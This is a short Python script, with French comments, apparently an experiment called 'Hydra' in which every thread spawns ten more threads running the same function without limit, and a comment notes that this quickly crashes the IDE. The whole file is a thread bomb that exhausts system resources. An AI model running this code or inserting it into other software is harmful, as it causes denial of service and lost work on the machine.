import threading


def create_thread():
    global threads_list
    for x in range(10):
        new_thread = threading.Thread(target=create_thread)
        threads_list.append(new_thread)
        print(f"Number of threads : {len(threads_list)}")
        new_thread.start()


adam = threading.Thread(target=create_thread)
threads_list = [adam]

adam.start()

# Hydra
# Fait rapidement planter l'IDE
# Une modification depuis GitHub
